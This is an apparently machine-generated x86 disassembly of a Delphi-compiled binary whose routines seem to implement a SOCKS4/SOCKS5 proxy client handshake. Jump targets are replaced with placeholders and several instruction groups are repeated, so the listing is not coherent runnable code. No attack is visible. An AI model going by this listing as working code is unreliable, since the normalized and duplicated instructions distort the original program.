push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_47b783
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp + 0x8 ]
cmp edx 0xffff
jbe r-xdata
push edx
push 0x1
mov edx ebx
call sub_47b374
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x8
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa0 ]
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
sub al 0x5a
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b78a
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
dec al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_47b794
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
xor eax eax
push ebp
push sub_47ba76
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x5
mov eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx ecx [ ebp + 0x10 ]
mov [ edx + eax ] cl
mov eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_463eb4
mov eax [ ebp - 0x8 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46ee14
test al al
je r-xdata
mov eax 0x3
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
mov eax 0x3
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
mov eax 0x3
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x4
mov eax 0x4
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
je r-xdata
mov [ edx + eax ] 0x3
mov eax ebx
call sub_405120
cmp eax 0xff
jbe r-xdata
mov [ edx + eax ] 0x1
mov edx ebx
mov eax [ r-xdata ]
call sub_47a954
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b962
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov edx 0x4
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462560
retn
push 0x4
push 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47a5cc
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
xor edx edx
call sub_463a00
mov [ edx + eax ] 0x10
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov edx ebx
mov eax [ r-xdata ]
call sub_47a954
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b8bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b8c4
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462560
retn
push 0x4
push 0x10
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47a5cc
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
call sub_463a00
mov [ ecx + edx ] al
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax ebx
call sub_405120
test eax eax
jle r-xdata
mov eax ebx
call sub_405120
mov edx [ ebp + 0x8 ]
add [ edx ] eax
jno r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax ebx
call sub_405120
push eax
lea ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax ebx
call sub_4646f0
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
xor edx edx
call sub_463a00
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ ebp + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
push 0x2
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_464878
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
xor edx edx
call sub_463a00
mov eax [ ebp + 0x8 ]
add [ eax ] 0x2
jno r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ba7d
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
call sub_403e34
sub_47b8c4
mov eax [ ebp + 0x8 ]
add [ eax ] 0x10
jno r-xdata
jmp r-xdata
call sub_403e34
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ ebp + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
push 0x2
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_464878
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
xor edx edx
call sub_463a00
mov eax [ ebp + 0x8 ]
add [ eax ] 0x2
jno r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ba7d
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_405af0
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
call sub_403e34
sub_47ba84
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47be0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_47c220
push 0xff
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
push eax
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax esi
call sub_47b794
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4648e8
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov ecx [ r-xdata ]
call sub_40644c
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
push ebp
push sub_47bb4d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x5
mov eax ebx
mov esi [ eax ]
call [ esi + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e2c
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
cmp eax 0x8
ja r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp [ eax * 4 + jump_table_47bba2 ]
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push sub_47bda8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
jno r-xdata
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ ebp - 0x8 ] 0x12
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47be11
lea eax [ ebp - 0x38 ]
mov edx 0xb
call sub_404e68
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
movzx eax [ edx + eax ]
add eax 0x2
jno r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403e34
sub_47be1c
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47c184
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4650b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47c154
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ esi + 0x88 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx [ esi + 0x90 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ ebp + 0x8 ]
cmp eax 0xffff
jbe r-xdata
push eax
push 0x2
mov ecx edi
mov edx ebx
mov eax esi
call sub_47b374
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x2
mov eax ebx
mov esi [ eax ]
call [ esi + 0xa0 ]
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
sub al 0x5a
je r-xdata
xor eax eax
push ebp
push sub_47c104
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0xa0 ]
push 0x0
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
dec al
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec al
je r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x20 ]
push r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec al
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
jmp r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x24 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x24 ]
push r-xdata
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x28 ]
push r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x2c ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x2c ]
lea eax [ ebp - 0x1c ]
mov edx 0x7
call sub_4051e4
mov eax [ ebp - 0x1c ]
push eax
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
mov eax [ ebx + 0xd0 ]
pop edx
call sub_474de0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c15b
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_47c15b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c18b
lea eax [ ebp - 0x30 ]
mov edx 0xa
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_47c197
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
movzx ebx [ eax + 0xa1 ]
dec ebx
sub bl 0x2
jb r-xdata
mov ebx [ ebp + 0xc ]
push ebx
call sub_47b654
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
push 0x0
call sub_47ba84
jmp r-xdata
sub_47c1e0
push ebx
mov ebx eax
mov eax ebx
call sub_474864
mov [ ebx + 0xa0 ] 0x0
mov [ ebx + 0xa1 ] 0x0
mov [ ebx + 0x90 ] 0x438
mov [ ebx + 0x94 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_465030
mov [ ebx + 0xa4 ] eax
pop ebx
retn
sub_47c220
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c5b8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x3
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x2
mov [ edx + eax ] 0x0
jmp r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0x5 ] al
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x5
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x1
lea edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor edx edx
push ebp
push j_sub_404570#9
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x2
mov eax esi
mov edi [ eax ]
call [ edi + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
cmp al [ ebp - 0x5 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
cmp al 0xff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c5bf
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_405af0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ ebx + 0x98 ]
call sub_405120
cmp eax 0xff
jbe r-xdata
cmp [ ebx + 0xa0 ] 0x1
jne r-xdata
mov [ ebp - 0x6 ] al
mov eax [ ebx + 0x8c ]
call sub_405120
cmp eax 0xff
jbe r-xdata
call sub_403e2c
mov [ ebp - 0x7 ] al
movzx eax [ ebp - 0x6 ]
add eax 0x3
jno r-xdata
call sub_403e2c
movzx edx [ ebp - 0x7 ]
add eax edx
jno r-xdata
call sub_403e34
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x1
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx ecx [ ebp - 0x6 ]
mov [ edx + eax ] cl
mov edi 0x2
cmp [ ebp - 0x6 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push edi
movzx eax [ ebp - 0x6 ]
push eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebx + 0x98 ]
mov dl 0x1
call sub_4646f0
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_463a00
movzx eax [ ebp - 0x6 ]
add edi eax
jno r-xdata
call sub_403e2c
cmp edi [ eax - 0x4 ]
jb r-xdata
call sub_403e34
movzx edx [ ebp - 0x7 ]
mov [ eax + edi ] dl
add edi 0x1
jno r-xdata
cmp [ ebp - 0x7 ] 0x0
jbe r-xdata
call sub_403e34
lea edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor edx edx
push ebp
push j_sub_404570#6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x2
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push edi
movzx eax [ ebp - 0x7 ]
push eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x8c ]
mov dl 0x1
call sub_4646f0
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_463a00
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
cmp [ edx + eax ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_47c5c8
push ebp
mov ebp esp
push ecx
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47cc43
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4650b8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47cbfd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xff
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor edx edx
mov edi ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ esi + 0x88 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
movzx edx [ esi + 0x94 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edx [ esi + 0x90 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov edx ebx
mov eax esi
call sub_47c220
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax esi
call sub_47b794
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4648e8
mov edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
push ebp
push sub_47c703
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e2c
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
cmp eax 0x8
ja r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp [ eax * 4 + jump_table_47c758 ]
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x38 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0x11 ] al
movzx eax [ ebp - 0x11 ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push sub_47cbad
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xa0 ]
movzx eax [ ebp - 0x11 ]
dec al
je r-xdata
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
dec al
je r-xdata
push 0x0
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
sub al 0x2
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
